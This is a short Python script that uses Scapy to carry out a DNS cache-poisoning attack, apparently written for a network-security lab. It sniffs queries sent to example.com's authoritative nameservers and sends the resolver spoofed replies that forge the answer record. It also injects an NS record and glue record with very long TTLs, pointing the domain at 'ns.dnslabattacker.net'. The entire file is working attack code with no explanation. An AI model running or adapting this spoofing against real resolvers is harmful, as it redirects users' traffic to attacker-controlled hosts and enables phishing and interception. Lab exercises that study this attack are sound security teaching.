from scapy.all import *

def callbackAnswer(pkt):
    if (str(pkt[IP].dst) == "199.43.135.53" or str(pkt[IP].dst) == "199.43.133.53"):
        s.send(IP(dst="192.168.122.230", src=str(pkt[IP].dst)) /\
            UDP(dport=53) /\
            DNS(id=pkt[DNS].id, qr=1, aa=1, rd=0, ra=0, cd=0, opcode=0, rcode=0, \
                qd=DNSQR(qname=pkt[DNS].qd.qname, qtype="A", qclass="IN"), \
                an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata='192.168.122.138'), \
                ns=DNSRR(rrname='example.com', type='NS', ttl=999999999, rdata='ns.dnslabattacker.net'), \
                ar=DNSRR(rrname="ns.dnslabattacker.net", type='A', ttl=999999999, rdata='192.168.122.138')))
        sys.exit(0)

s = conf.L3socket(iface='vnet0')
sniff(iface="vnet0", filter="udp", prn=callbackAnswer)
